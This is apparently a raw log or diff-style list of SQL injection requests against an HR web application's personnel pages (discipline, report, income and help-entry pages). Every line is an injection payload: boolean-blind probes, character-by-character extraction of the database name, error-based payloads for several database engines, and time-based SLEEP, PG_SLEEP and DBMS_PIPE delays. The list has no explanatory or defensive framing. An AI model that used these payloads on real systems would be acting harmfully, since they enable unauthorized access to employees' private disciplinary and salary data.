+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 102
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 103
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 64
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 96
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 112
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 120
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 116
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 114
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 113
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 64
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 32
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 16
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 8
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 4
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 2
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 1
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 11=11
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 AND 11=12
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 AND 11=11
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533) AND 6258=6334 AND (6408=6408
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533) AND 5156=5156 AND (8081=8081
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533) AND 4039=5679 AND (6503=6503
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 AND 8246=4166
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 AND 5156=5156
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 AND 2645=5138
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533) AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (4657=4657
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533) AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC) AND (1067=1067
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC)
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533) AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND (5089=5089
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58)))
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533) AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL) AND (9941=9941
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL)
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 AND 1=1
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 AND 1=2
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 6926=5201 AND (6933=6933
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 4954=4954 AND (3292=3292
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 7432=5698
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 4954=4954
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND (SELECT 2742 FROM(SELECT COUNT(*),CONCAT(0x3a6f68663a,(SELECT (CASE WHEN (2742=2742) THEN 1 ELSE 0 END)),0x3a6a756f3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (8951=8951
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND (SELECT 2742 FROM(SELECT COUNT(*),CONCAT(0x3a6f68663a,(SELECT (CASE WHEN (2742=2742) THEN 1 ELSE 0 END)),0x3a6a756f3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 7002=CAST((CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58))||(SELECT (CASE WHEN (7002=7002) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58)) AS NUMERIC) AND (4799=4799
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 7002=CAST((CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58))||(SELECT (CASE WHEN (7002=7002) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58)) AS NUMERIC)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 1291=CONVERT(INT,(CHAR(58)+CHAR(111)+CHAR(104)+CHAR(102)+CHAR(58)+(SELECT (CASE WHEN (1291=1291) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(117)+CHAR(111)+CHAR(58))) AND (3875=3875
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 1291=CONVERT(INT,(CHAR(58)+CHAR(111)+CHAR(104)+CHAR(102)+CHAR(58)+(SELECT (CASE WHEN (1291=1291) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(117)+CHAR(111)+CHAR(58)))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 1656=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58)||(SELECT (CASE WHEN (1656=1656) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58)||CHR(62))) FROM DUAL) AND (7362=7362
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 1656=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58)||(SELECT (CASE WHEN (1656=1656) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58)||CHR(62))) FROM DUAL)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND SLEEP(5) AND (2361=2361
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND SLEEP(5)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 5021=(SELECT 5021 FROM PG_SLEEP(5)) AND (5088=5088
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 5021=(SELECT 5021 FROM PG_SLEEP(5))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 2636=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(112)||CHR(119)||CHR(100),5) AND (5951=5951
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 2636=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(112)||CHR(119)||CHR(100),5)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 4857=9055 AND (7583=7583
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 2861=2861 AND (1500=1500
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 3715=6482 AND (8369=8369
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 2291=9295
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 2861=2861
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 9150=3644
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND (SELECT 3569 FROM(SELECT COUNT(*),CONCAT(0x3a76676a3a,(SELECT (CASE WHEN (3569=3569) THEN 1 ELSE 0 END)),0x3a76636b3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (1247=1247
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND (SELECT 3569 FROM(SELECT COUNT(*),CONCAT(0x3a76676a3a,(SELECT (CASE WHEN (3569=3569) THEN 1 ELSE 0 END)),0x3a76636b3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 4214=CAST((CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58))||(SELECT (CASE WHEN (4214=4214) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58)) AS NUMERIC) AND (6404=6404
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 4214=CAST((CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58))||(SELECT (CASE WHEN (4214=4214) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58)) AS NUMERIC)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 8008=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(103)+CHAR(106)+CHAR(58)+(SELECT (CASE WHEN (8008=8008) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(118)+CHAR(99)+CHAR(107)+CHAR(58))) AND (7324=7324
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 8008=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(103)+CHAR(106)+CHAR(58)+(SELECT (CASE WHEN (8008=8008) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(118)+CHAR(99)+CHAR(107)+CHAR(58)))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 4531=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58)||(SELECT (CASE WHEN (4531=4531) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58)||CHR(62))) FROM DUAL) AND (3360=3360
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 4531=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58)||(SELECT (CASE WHEN (4531=4531) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58)||CHR(62))) FROM DUAL)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND SLEEP(5) AND (9609=9609
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 8347=(SELECT 8347 FROM PG_SLEEP(5)) AND (9786=9786
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 8347=(SELECT 8347 FROM PG_SLEEP(5))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 5108=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(120)||CHR(113)||CHR(77),5) AND (3328=3328
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 5108=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(120)||CHR(113)||CHR(77),5)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 3358=8780 AND (6631=6631
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 8932=8932 AND (4439=4439
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 7345=7946 AND (1227=1227
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 9469=9094
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 8932=8932
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 6704=2866
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND (SELECT 1376 FROM(SELECT COUNT(*),CONCAT(0x3a6a71643a,(SELECT (CASE WHEN (1376=1376) THEN 1 ELSE 0 END)),0x3a706d693a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (8413=8413
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND (SELECT 1376 FROM(SELECT COUNT(*),CONCAT(0x3a6a71643a,(SELECT (CASE WHEN (1376=1376) THEN 1 ELSE 0 END)),0x3a706d693a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 9883=CAST((CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (9883=9883) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)) AS NUMERIC) AND (8588=8588
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 9883=CAST((CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (9883=9883) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)) AS NUMERIC)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 5463=CONVERT(INT,(CHAR(58)+CHAR(106)+CHAR(113)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (5463=5463) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(112)+CHAR(109)+CHAR(105)+CHAR(58))) AND (7403=7403
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 5463=CONVERT(INT,(CHAR(58)+CHAR(106)+CHAR(113)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (5463=5463) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(112)+CHAR(109)+CHAR(105)+CHAR(58)))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 6888=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (6888=6888) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)||CHR(62))) FROM DUAL) AND (4484=4484
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 6888=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (6888=6888) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)||CHR(62))) FROM DUAL)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND SLEEP(5) AND (2779=2779
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 2061=(SELECT 2061 FROM PG_SLEEP(5)) AND (8262=8262
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 2061=(SELECT 2061 FROM PG_SLEEP(5))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 4931=DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(120)||CHR(111)||CHR(98),5) AND (4203=4203
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 4931=DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(120)||CHR(111)||CHR(98),5)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 6771=7628 AND (5726=5726
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 6143=6143 AND (2665=2665
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 3134=5207 AND (7933=7933
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 7754=7887
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 6143=6143
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 8490=5746
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND (SELECT 6617 FROM(SELECT COUNT(*),CONCAT(0x3a6e68773a,(SELECT (CASE WHEN (6617=6617) THEN 1 ELSE 0 END)),0x3a6f62673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (3085=3085
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND (SELECT 6617 FROM(SELECT COUNT(*),CONCAT(0x3a6e68773a,(SELECT (CASE WHEN (6617=6617) THEN 1 ELSE 0 END)),0x3a6f62673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 4055=CAST((CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58))||(SELECT (CASE WHEN (4055=4055) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58)) AS NUMERIC) AND (6798=6798
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 4055=CAST((CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58))||(SELECT (CASE WHEN (4055=4055) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58)) AS NUMERIC)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 4529=CONVERT(INT,(CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+(SELECT (CASE WHEN (4529=4529) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58))) AND (4220=4220
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 4529=CONVERT(INT,(CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+(SELECT (CASE WHEN (4529=4529) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58)))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) AND 2029=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58)||(SELECT (CASE WHEN (2029=2029) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND (3492=3492
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate AND 2029=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58)||(SELECT (CASE WHEN (2029=2029) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL)
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 7294=7992 AND (2102=2102
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 9396=9396 AND (9860=9860
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 8294=9358 AND (1000=1000
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 3245=9585
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 9396=9396
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 1565=9624
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND (SELECT 2383 FROM(SELECT COUNT(*),CONCAT(0x3a6c75613a,(SELECT (CASE WHEN (2383=2383) THEN 1 ELSE 0 END)),0x3a6470753a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (7204=7204
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND (SELECT 2383 FROM(SELECT COUNT(*),CONCAT(0x3a6c75613a,(SELECT (CASE WHEN (2383=2383) THEN 1 ELSE 0 END)),0x3a6470753a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 9482=CAST((CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58))||(SELECT (CASE WHEN (9482=9482) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58)) AS NUMERIC) AND (7236=7236
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 9482=CAST((CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58))||(SELECT (CASE WHEN (9482=9482) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58)) AS NUMERIC)
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 6660=CONVERT(INT,(CHAR(58)+CHAR(108)+CHAR(117)+CHAR(97)+CHAR(58)+(SELECT (CASE WHEN (6660=6660) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(100)+CHAR(112)+CHAR(117)+CHAR(58))) AND (9506=9506
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 6660=CONVERT(INT,(CHAR(58)+CHAR(108)+CHAR(117)+CHAR(97)+CHAR(58)+(SELECT (CASE WHEN (6660=6660) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(100)+CHAR(112)+CHAR(117)+CHAR(58)))
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 5262=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58)||(SELECT (CASE WHEN (5262=5262) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58)||CHR(62))) FROM DUAL) AND (7593=7593
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 5262=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58)||(SELECT (CASE WHEN (5262=5262) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58)||CHR(62))) FROM DUAL)
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND SLEEP(5) AND (5143=5143
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND SLEEP(5)
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 1543=(SELECT 1543 FROM PG_SLEEP(5)) AND (3000=3000
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 1543=(SELECT 1543 FROM PG_SLEEP(5))
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 5257=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(77)||CHR(98)||CHR(76),5) AND (3117=3117
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 5257=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(77)||CHR(98)||CHR(76),5)
